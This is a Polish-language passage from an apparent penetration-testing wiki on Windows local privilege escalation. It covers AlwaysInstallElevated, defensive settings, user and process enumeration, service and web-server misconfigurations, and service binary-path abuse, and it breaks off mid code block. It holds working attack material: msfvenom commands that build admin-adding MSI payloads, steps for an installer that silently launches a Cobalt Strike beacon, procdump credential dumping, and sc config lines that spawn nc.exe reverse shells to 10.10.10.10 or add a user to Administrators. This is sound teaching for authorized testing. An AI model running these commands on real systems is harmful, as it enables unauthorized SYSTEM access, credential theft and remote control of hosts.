Sprawdź rzeczywistą politykę kontrolera domeny (DC) dotyczącą [podpisywania LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [wiązania kanału LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), listę ACL obiektu tożsamości poddanej relayowi oraz poziomy uwierzytelniania i personifikacji wybranej klasy COM. Typ logowania i kontekst poświadczeń wywołującego mają znaczenie: sesja WinRM może działać inaczej niż logowanie interaktywne lub logowanie z nowymi poświadczeniami. Wynik mogą też zmienić zapora sieciowa, routing OXID i zainstalowane aktualizacje. Traktuj permisywną politykę lub pasującą listę ACL jako kandydatów do weryfikacji; pasywne wyliczanie nie powinno powodować wymuszania uwierzytelnienia przez COM, uwierzytelniania przez relay ani zapisów w katalogu. Shadow credential konta komputera może prowadzić do uzyskania biletu komputera, a dopiero jeśli to konto ma wymagane uprawnienia replikacji katalogu — do osobnej ścieżki DCSync.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz w artykule [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Jeśli** te 2 rejestry są **włączone** (wartość **0x1**), użytkownicy z dowolnymi uprawnieniami mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu plik binarny Windows MSI służący do eskalacji uprawnień. Ten skrypt zapisuje prekompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (dlatego będziesz potrzebować dostępu GIU):

```
Write-UserAddMSI
```

Po prostu uruchom utworzony plik binarny, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten samouczek, aby dowiedzieć się, jak utworzyć MSI wrapper przy użyciu tego narzędzia. Pamiętaj, że możesz opakować plik „**.bat**”, jeśli chcesz **tylko** **wykonywać** **polecenia**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Tworzenie MSI za pomocą WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Tworzenie MSI za pomocą Visual Studio

- Wygeneruj za pomocą Cobalt Strike lub Metasploit **nowy payload Windows EXE TCP** w lokalizacji `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, jako lokalizację użyj **`C:\privesc`**, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż przejdziesz do kroku 3 z 4 (wybór plików do dołączenia). Kliknij **Add** i wybierz właśnie wygenerowany payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer**, a następnie w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
  - Możesz zmienić również inne właściwości, takie jak **Author** i **Manufacturer**, dzięki czemu zainstalowana aplikacja może wyglądać bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Dzięki temu payload Beacon zostanie uruchomiony natychmiast po uruchomieniu instalatora.
- W sekcji **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj projekt**.
  - Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że platforma jest ustawiona na x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` **w tle:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antywirus i detektory

### Ustawienia audytu

Te ustawienia określają, co jest **rejestrowane**, więc należy zwrócić na nie uwagę

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** służy do **zarządzania hasłami lokalnego Administratora** i zapewnia, że na komputerach dołączonych do domeny każde hasło jest **unikatowe, losowe i regularnie aktualizowane**. Hasła są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp wyłącznie użytkownicy, którym przyznano wystarczające uprawnienia za pomocą ACL, co pozwala im wyświetlać hasła lokalnego administratora, jeśli są do tego upoważnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywny, **hasła w postaci jawnego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Począwszy od **Windows 8.1**, Microsoft wprowadził ulepszoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu pamięci** przez niezaufane procesy lub wstrzykiwania kodu, dodatkowo zabezpieczając system.\
[**Więcej informacji o LSA Protection tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego zadaniem jest ochrona poświadczeń przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Buforowane poświadczenia

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez składniki systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zwykle ustanawiane są poświadczenia domenowe użytkownika.\
[**Więcej informacji o buforowanych poświadczeniach tutaj**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Enumerowanie użytkowników i grup

Sprawdź, czy któraś z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Grupy uprzywilejowane

Jeśli **należysz do grupy uprzywilejowanej, możesz być w stanie eskalować uprawnienia**. Dowiedz się więcej o grupach uprzywilejowanych i o tym, jak je wykorzystać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulowanie tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na poniższej stronie dowiesz się, **jakie tokeny są interesujące** i jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje

```bash
qwinsta
klist sessions
```

### Foldery domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Polityka haseł

```bash
net accounts
```

### Pobieranie zawartości schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, wyświetlając procesy, **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać uruchomiony plik binarny** albo czy masz uprawnienia do zapisu w folderze z plikiem binarnym, aby wykorzystać potencjalne [**ataki DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium** — można je wykorzystać do eskalacji uprawnień](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Nasłuch debuggera może działać krótko, więc brak go w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był wystawiony. Powiąż zaobserwowany nasłuch z jego PID-em, właścicielem procesu i możliwością dostępu do niego przez użytkownika o niższych uprawnieniach; sama nazwa aplikacji lub flaga debugowania nie potwierdza możliwości wykonania kodu z innego konta. Podczas rutynowego rozpoznania ogranicz się do metod pasywnych — nie wysyłaj poleceń do debuggera.

**Sprawdzanie uprawnień plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów zawierających pliki binarne procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamicznych preprocessorów Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wskazanej za pomocą `snort.exe -c <config>`. W przypadku zadania zaplanowanego lub usługi uruchamiającej Snort na innym koncie sprawdź tę konkretną konfigurację oraz ACL zadeklarowanego katalogu modułów. Jeśli Twój token pozwala tworzyć tam pliki, ścieżka ta jest warta sprawdzenia pod kątem wykonania kodu przy następnym ładowaniu modułów przez to zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta, na którym uruchamiany jest proces, aktywną konfigurację, zgodność modułów oraz ewentualne ograniczenia wynikające z reguł odmowy lub udziału; sam zapis do katalogu nie dowodzi możliwości eskalacji. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa sieciowa z zapisywalnym katalogiem dokumentów

W instalacji Apache w systemie Windows porównaj ścieżkę do pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowej instalacji XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik o niższych uprawnieniach może tworzyć pliki w tym katalogu, a Apache działa jako `LocalSystem`, wykonanie kodu po stronie serwera może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, udostępniana jest dokładnie ta ścieżka, a handler po stronie serwera przetwarza dany typ pliku; sam zapis do katalogu dowodzi jedynie możliwości tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W typowej instalacji WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja może znajdować się obok niego w `conf\httpd.conf`, zaś domyślny katalog główny to `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź łącznie dokładny obraz usługi, tożsamość, z której działa, efektywny `DocumentRoot` (w tym rozwinięcie `${INSTALL_DIR}` i nadpisania dla wirtualnych hostów) oraz ACL katalogu głównego. Katalog WAMP z prawem zapisu nie dowodzi, że Apache działa jako `SYSTEM` ani że wykona przesłany plik. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i tożsamość sieciowa puli aplikacji

W przypadku IIS powiąż zapisywalny katalog fizyczny z **aktywną witryną/aplikacją** w `applicationHost.config`, a następnie ustal skonfigurowaną pulę i handler po stronie serwera. Kod umieszczony w udostępnianym katalogu działa jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku, a trasa jest osiągalna. Zanim uznasz zapisywalny katalog za możliwość wykonania kodu, sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan działania witryny, handler i nadpisania dotyczące poszczególnych ścieżek.

Kompilacja dynamiczna ASP.NET wymaga sprawdzenia osobnej ścieżki: wygenerowanych plików w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie `<compilation tempDirectory>` aplikacji może zmienić tę lokalizację. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) and [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token o niższych uprawnieniach pozwala zmodyfikować wygenerowane źródło w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie je kompiluje z użyciem bardziej uprzywilejowanej [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sama lista ACL pliku lub katalogu nie dowodzi możliwości wykonania kodu: powiąż pamięć podręczną z aktywną aplikacją, efektywnym tokenem i ACL, ustawieniami kompilacji, tożsamością procesu oraz momentem ewentualnej ponownej kompilacji. Korzystaj z przeglądu metadanych w trybie tylko do odczytu; podczas enumeracji nie wywołuj kompilacji ani nie modyfikuj plików pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` zwykle uwierzytelnia się w zasobach domenowych jako **konto komputera hosta**, mimo że jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zazwyczaj korzysta z anonimowych poświadczeń sieciowych. Pula `SpecificUser` używa skonfigurowanego konta. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) and [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się między wersjami IIS, dlatego ustal efektywną konfigurację zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli używającej tożsamości sieciowej konta komputera, oceń uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień replikacji w kontekście nazewniczym domeny; sam ticket konta komputera lub rola hosta nie dowodzą ich posiadania. Pasywna enumeracja powinna obejmować sprawdzenie konfiguracji i ACL bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania ticketów.

W przypadku czytelnego handlera ASP.NET, który uruchamia proces pomocniczy, prześledź każdą wartość pochodzącą z żądania przez uwierzytelnianie, deszyfrowanie, walidację i tworzenie polecenia. Handler, który łączy zdekodowany token z `ProcessStartInfo("cmd", "/c ...")`, może umożliwić metaznakom powłoki zmianę polecenia; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany klient może rzeczywiście wpływać na zdekodowaną wartość i dotrzeć do handlera, a następnie określ efektywną tożsamość puli aplikacji lub podszywaną tożsamość oraz tożsamość procesu potomnego. Czytelny wiersz kodu źródłowego, nasłuchujący lokalnie port lub słabość formatu tokenu nie dowodzą same w sobie możliwości wykonania uprzywilejowanych poleceń. Podczas pasywnej enumeracji sprawdzaj kod źródłowy i konfigurację puli bez wysyłania sfałszowanych żądań ani uruchamiania procesu pomocniczego.

W przypadku usługi PHP w systemie Windows ścieżka kontrolowana przez żądanie, przekazana do [`include` or `require`](https://www.php.net/manual/en/function.include.php), może wykonać zapisywalny przez użytkownika o niższych uprawnieniach plik PHP z tożsamością procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, rozwiązana ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może modyfikować, a proces roboczy odczytać, obowiązujące ograniczenia ścieżek PHP pozwalają na dołączenie pliku, a proces roboczy rzeczywiście działa z wyższymi uprawnieniami. Nasłuchujący lokalnie port ani zapisywalny plik nie dowodzą istnienia takiego łańcucha; podczas pasywnej enumeracji sprawdzaj kod źródłowy, tożsamość usługi i ACL plików bez wywoływania endpointu.

### Pozyskiwanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z pakietu sysinternals. Usługi takie jak FTP przechowują **poświadczenia w pamięci w postaci jawnego tekstu**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niezabezpieczone aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą pozwalać użytkownikowi na uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Windows Help and Support” (Windows + F1), wyszukaj „command prompt”, kliknij „Click to open Command Prompt”

### Import plików projektów z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu drop zapisywalnego przez użytkownika o niższych uprawnieniach, przekracza granicę zaufania dla danych wejściowych, działając na koncie importera. Sprawdź **dokładną ścieżkę zapisywalną**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem z otwieraniem/przywracaniem projektu Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła wywołać uwierzytelnianie z konta importującego, jeśli pozwalały na to [zasady dotyczące wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To sygnał możliwego ujawnienia poświadczeń, a nie natychmiastowy dostęp administratora: uzyskaną odpowiedź trzeba wykorzystać za pośrednictwem osobnej, autoryzowanej lub podatnej ścieżki, a bieżące wersje należy ocenić pod kątem faktycznego stanu poprawek. Nie otwieraj spreparowanego projektu podczas pasywnego rozpoznania; sprawdź przebieg importowania i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do obiektu Service Control Manager (SCM) jest niezależne od praw do istniejącej usługi. Pomyślne, tylko do odczytu żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) dotyczące tego prawa jest sygnałem do sprawdzenia, a nie dowodem, że można uruchomić nową usługę. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi określonymi podczas jej tworzenia; ponowne otwarcie usługi później powoduje osobną kontrolę dostępu i może się nie powieść, nawet jeśli można było użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, przyznane prawa uchwytu, konto usługi, zasady uruchamiania i ścieżkę pliku wykonywalnego. Nie twórz ani nie uruchamiaj usługi podczas pasywnego rozpoznania.

W przypadku zdalnej ścieżki instalacji usługi powiąż te prawa SCM z udziałem na komputerze docelowym, do którego **to samo logowanie sieciowe** ma uprawnienia zapisu, bazową ACL NTFS oraz lokalną ścieżką pliku wykonywalnego, który może uruchomić konto usługi. Konto niebędące administratorem może przekroczyć tę granicę, jeśli występują wyjątkowo szerokie prawa SCM i dostępna jest ścieżka umieszczania pliku; udział administracyjny nie jest warunkiem koniecznym. Sam dostęp do zapisu w udziale lub sam sygnał pozwalający utworzyć usługę przez SCM nie dowodzi, że nowa usługa może zostać uruchomiona z wyższą tożsamością.

Istniejąca usługa może wywoływać pomocniczy plik wykonywalny podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli pliku tego nie ma w jej `ImagePath`. Jeśli nazwa pomocnika jest rozwiązywana do katalogu zapisywalnego przez użytkownika o niższych uprawnieniach, a usługa działa z wyższą tożsamością, brakujący plik pomocnika może warunkowo nadawać się do zastąpienia. Potwierdź **faktyczny kod usługi lub udokumentowane wywołanie pomocnika**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność przeszukiwania, uprawnienia do tworzenia katalogu, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Sam zapisywalny katalog usługi lub brakujący plik nie dowodzi, że usługa załaduje ten plik; podczas pasywnego sprawdzania nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazywać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to prawo odrębne od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo uruchamiania za coś więcej niż prawo do sterowania usługą, sprawdź jej kod lub udokumentowany interfejs. Jeśli usługa używa argumentu wybranego przez wywołującego jako ścieżki dziennika lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ argumentu do operacji zapisu, ograniczenia ścieżki oraz uprawnienia do **utworzonego pliku**. Zapis w chronionym katalogu może prowadzić do eskalacji tylko wtedy, gdy osobny uprzywilejowany proces lub mechanizm ładujący akceptuje ten plik; sam zapisywalny dziennik lub prawo uruchamiania nie wystarcza. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ możliwość odczytu `nsclient.ini` jest **sygnałem do sprawdzenia konfiguracji**: plik może zawierać poświadczenia webowe, a `boot.ini` może przekierowywać konfigurację do innej lokalizacji. Sprawdź faktyczne konto usługi, nasłuchujący interfejs WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Wykonywanie z podwyższonymi uprawnieniami wymaga dodatkowo `CheckExternalScripts` (lub innej włączonej ścieżki wykonywania), faktycznego prawa do zarejestrowania lub zmodyfikowania polecenia oraz wyzwalacza uruchamiającego je z tożsamością usługi. Interfejs nasłuchujący tylko na loopback nadal może być dostępny dla lokalnego użytkownika, ale sama ścieżka pliku, hasło lub interfejs nasłuchujący nie dowodzą istnienia tych praw. Podczas pasywnego rozpoznania sprawdzaj metadane i uprawnienia bez wyświetlania sekretów ani wywoływania web API. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące bezpieczeństwa web i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` wskazuje `nssm.exe`, sprawdź rzeczywiste konto, na którym działa usługa, oraz jej wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację podrzędną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), natomiast `AppDirectory` określa skonfigurowany katalog roboczy. Zanim uznasz uprawnienia wrappera za pełny obraz granicy bezpieczeństwa usługi, sprawdź plik wykonywalny aplikacji podrzędnej i ACL jego katalogu nadrzędnego. Lokalny punkt końcowy WCF lub SOAP udostępniany przez tę aplikację to osobny sygnał do sprawdzenia: potwierdź, że użytkownik o niższych uprawnieniach może połączyć się z nasłuchującym punktem końcowym, że konkretna operacja przyjmuje jego dane wejściowe oraz że aplikacja podrzędna usługi wykonuje niebezpieczną operację z wyższą tożsamością. Konto usługi, adres URL punktu końcowego ani zapisywalna ścieżka nie dowodzą same w sobie możliwości eskalacji; podczas pasywnego rozpoznania nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu znaków kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia potok](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportowymi Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale prawo do wywołania **konkretnej** operacji oraz efektywną tożsamość runspace należy sprawdzić osobno. Ścieżka od danych wejściowych wywołującego o niższych uprawnieniach do `AddScript` wykonywanego z wyższą tożsamością usługi stanowi granicę wykonywania kodu; sam nasłuchujący port, uwierzytelniony klient lub niewykorzystywana metoda w niezwiązanym zestawie nie są dowodem. Podczas rozpoznania sprawdź statycznie wdrożoną usługę, kontrakt, autoryzację i ustawienia impersonacji, nie wywołując punktu końcowego.

Service Triggers pozwalają systemowi Windows uruchamiać usługę, gdy wystąpią określone warunki (aktywność nazwanego potoku/punktu końcowego RPC, zdarzenia ETW, dostępność IP, podłączenie urządzenia, odświeżenie GPO itp.). Nawet bez praw SERVICE_START często można uruchamiać uprzywilejowane usługi, wywołując ich wyzwalacze. Techniki enumeracji i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa kolektora diagnostycznego Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150` — usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. W [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystano junction i wyścig z object-manager-link, aby przekierować reset DACL usługi. Do zademonstrowanej eskalacji potrzebna była także dostępna ścieżka naprawy MSI programu Visual Studio Setup WMI Provider oraz jej docelowy plik `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponent został poprawiony w styczniu 2024 r.

W ramach pasywnej oceny sprawdź konto i ścieżkę binarną tej konkretnej usługi, czy istnieje ścieżka kompilatora Setup WMI oraz stan poprawek zainstalowanego komponentu. Sam wpis usługi, wersja produktu Visual Studio ani plik kompilatora nie dowodzą, że host jest podatny. Do sprawdzenia nie trzeba uruchamiać usługi ani wykonywać naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się posiadanie pliku binarnego **accesschk** z pakietu _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy grupa „Authenticated Users” może modyfikować jakąkolwiek usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Wystąpił błąd systemu 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona albo nie ma włączonych urządzeń skojarzonych z tą usługą._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Pamiętaj, że usługa upnphost wymaga do działania SSDPSRV (w przypadku XP SP1)**

**Innym obejściem tego problemu** jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikacja ścieżki pliku binarnego usługi**

Jeśli grupa „Użytkownicy uwierzytelnieni” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, można zmodyfikować jej plik wykonywalny. Aby zmodyfikować usługę i uruchomić `sc`:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Uruchom ponownie usługę

```bash
